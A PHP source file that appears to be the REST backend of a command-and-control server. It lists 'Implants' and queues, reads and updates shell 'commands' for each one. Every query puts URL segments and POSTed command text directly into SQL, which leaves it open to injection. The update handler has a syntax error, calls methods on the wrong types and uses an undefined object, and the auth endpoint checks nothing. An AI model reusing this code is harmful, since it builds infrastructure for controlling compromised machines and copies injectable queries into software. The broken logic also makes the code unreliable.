<?php

require_once 'db.php';

header("Content-Type: application/json; charset=UTF-8");
//header("Access-Control-Allow-Origin: *");
//header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE");

$parts = explode("/", $_SERVER["REQUEST_URI"]);

if ($parts[1] != "api") {
    http_response_code(404);
    die();
}


// Function to recursively convert all strings to valid UTF-8
function utf8ize($data) {
    if (is_array($data)) {
        foreach ($data as $k => $v) {
            $data[$k] = utf8ize($v);
        }
        return $data;
    } elseif (is_string($data)) {
        return mb_convert_encoding($data, 'UTF-8', 'UTF-8'); // removes invalid sequences
    } else {
        return $data;
    }
}


function main() {
    global $parts, $pdo;

    $method = $_SERVER["REQUEST_METHOD"];
    switch ($method) {
        case "GET":
            switch ($parts[2]) {
                case "implants":
                    $stmt = $pdo->query("SELECT * FROM Implants");
                    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                    echo json_encode($results);
                    break;
                case "tasks":
                    $implant_id = $parts[3] ?? null;
                    if ($implant_id == null) {
                        $stmt = $pdo->query("SELECT * FROM Tasks");
                        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                        $json = utf8ize($results);
                        $json = json_encode($json, JSON_UNESCAPED_UNICODE | JSON_PARTIAL_OUTPUT_ON_ERROR);
                        if ($json === false) {
                                echo "json_encode() failed: ".json_last_error_msg();
                                var_dump(json_last_error());
                        } else {
                                echo $json;
                        }
                        break;
                    } else {
                        $stmt = $pdo->query("SELECT task_id, command, response, status FROM Tasks WHERE implant_id = '$implant_id'");
                        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                        echo json_encode($results);
                        break;
                    }
                default;
                http_response_code(404);
                die();
            }
            break;
        case "PUT":
            switch ($parts[2]) {
            case "update_task":
                $task_id = $parts[3] ?? null;
                if ($task_id == null ) {
                    http_response_code(404);
                    die();
                }
                if (!isset($_POST['cmd'])) {
                    http_response_code(304);
                    die();
                }
                $cmd = $_POST['cmd'];
                // check if status  = 0
                $stmt = $pdo->query("SELECT status FROM Tasks WHERE task_id = $task_id");
                $result = $stmt->fetchALL(PDO : FETCH_ASSOC);
                $row = $result->fetch_assoc();
                if ($row[0] != 0) {
                    $reply->update = false;
                    echo json_encode($reply);
                    return  ;
                }
                $stmt = $pdo->query("UPDATE Tasks SET command = '$cmd' WHERE task_id = $task_id");
                $reply->update = true;
                echo json_encode($reply);
                break;
                default;
                    http_response_code(404);
                    die();
            }
            break;
        case "POST":
            switch ($parts[2]) {
                case "new_task":
                    $implant_id = $parts[3] ?? null;
                    if ($implant_id == null) {
                        // find suitable response code
                        http_response_code(404);
                        die();
                    }
                    if (!isset($_POST['cmd'])) {
                        http_response_code(304);
                        die();
                    }
                    $cmd = $_POST['cmd'];
                    $stmt = $pdo->query("INSERT INTO Tasks (implant_id, command) VALUES ('$implant_id', '$cmd')");
                    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                    echo json_encode($results);
                    break;

                case "auth":
                    if (!isset($_POST["username"]) || !isset($_POST["password"])) {
                        die("Invalid Username or Password Field");
                    }
                    break;
                default;
                http_response_code(404);
                die();
            }
            break;
        case "DELETE":
            break;
        default:
            http_response_code(404);
            die();
    }
}

main();
?>